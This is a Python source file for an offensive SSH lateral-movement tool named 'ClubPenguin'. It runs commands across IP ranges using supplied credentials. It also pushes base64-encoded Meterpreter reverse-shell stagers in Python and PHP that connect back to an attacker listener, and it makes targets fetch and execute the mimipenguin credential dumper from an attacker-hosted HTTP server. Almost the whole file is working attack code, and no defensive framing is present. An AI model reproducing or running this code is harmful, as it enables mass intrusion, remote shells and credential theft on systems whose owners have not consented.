import base64
import paramiko
import sys
import SimpleHTTPServer
import SocketServer
import thread
import argparse
import socket
from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
from threading import Thread

def execute_command(targets, port, username, password, command):
    for ip in targets:
        try:
            print "Trying to connect to " + str(ip)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(str(ip), port=port, username=username, password=password, timeout=1)
            stdin, stdout, stderr = client.exec_command(command)
            print "[+] Authentication success on " + str(ip)
            for line in stdout.readlines():
                print line
            client.close()
        except:
            print "[-] Authentication fail on " + str(ip)
            pass

def stager_meterpreter_python(listen_ip, listen_port, ip, port, username, password):
    stager = '''
import socket,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('%s',%s))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})

    ''' % (listen_ip, listen_port)
    payload = base64.b64encode(stager, 'utf-8')
    execute_command(ip, port, username, password, "echo \"import base64,sys;"
    "exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &")

def stager_meterpreter_php(listen_ip, listen_port, ip, port, username, password):

        stager = '''
    error_reporting(0);
    $ip   = '%s';
    $port = %s;
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s      = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    } elseif (($f = 'fsockopen') && is_callable($f)) {
        $s      = $f($ip, $port);
        $s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    } else {
        die('no socket funcs');
    }
    if (!$s) {
        die('no socket');
    }
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }
    if (!$len) {
        die();
    }
    $a   = unpack("Nlen", $len);
    $len = $a['len'];
    $b   = '';
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    $GLOBALS['msgsock']      = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();

    ''' % (listen_ip, listen_port)
        payload = base64.b64encode(stager, 'utf-8')
        execute_command(ip, port, username, password, "php -r 'eval(base64_decode(\"" + payload + "\"));'")

def start_server(a,b):
    PORT = 8080
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", PORT), Handler)
    print "serving at port", PORT
    httpd.serve_forever()

def get_ip():
    local_ip = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [
        [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in
         [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
    return local_ip

def mimipenguin(lhost, lport, targets, port, username, password):
    thread.start_new_thread(start_server, ('MyStringHere',1))
    execute_command(targets, port, username, password, "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}"
    "[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) +
    "/mimipenguin.py'); exec(r.read());\" | python &")

def parse_targets(target):
    #Stolen from CrackMapExec
    if '-' in target:
        ip_range = target.split('-')
        try:
            hosts = IPRange(ip_range[0], ip_range[1])
        except AddrFormatError:
            try:
                start_ip = IPAddress(ip_range[0])

                start_ip_words = list(start_ip.words)
                start_ip_words[-1] = ip_range[1]
                start_ip_words = [str(v) for v in start_ip_words]

                end_ip = IPAddress('.'.join(start_ip_words))

                t = IPRange(start_ip, end_ip)
            except AddrFormatError:
                t = target
    else:
        try:
            t = IPNetwork(target)
        except AddrFormatError:
            t = target

    if type(t) == IPNetwork or type(t) == IPRange:
        return list(t)
    else:
        return [t.strip()]

def main():
    parser = argparse.ArgumentParser(description='ClubPenguin')
    parser.add_argument("first_arg", nargs=1)
    parser.add_argument('-u','--username', help='SSH username',required=True)
    parser.add_argument('-p','--password',help='SSH password', required=True)
    parser.add_argument('-x','--command',help='Command to execute', required=False)
    parser.add_argument('-m', '--module', help='Module to run', required=False)
    parser.add_argument('-o', '--options', help='Options for module', required=False)
    args = parser.parse_args()
    ip = args.first_arg[0]
    targets = parse_targets(ip)
    if args.command:
       execute_command(targets, 22, args.username, args.password, args.command)
    #mimipenguin(get_ip(), 8080, targets, 22,'root','pass')
    #stager_meterpreter_python('10.0.1.18', 4444, targets, 22, args.username, args.password)
    #stager_meterpreter_php('10.0.1.18', 4444, targets, 22, args.username, args.password)

if __name__ == "__main__":

    main()





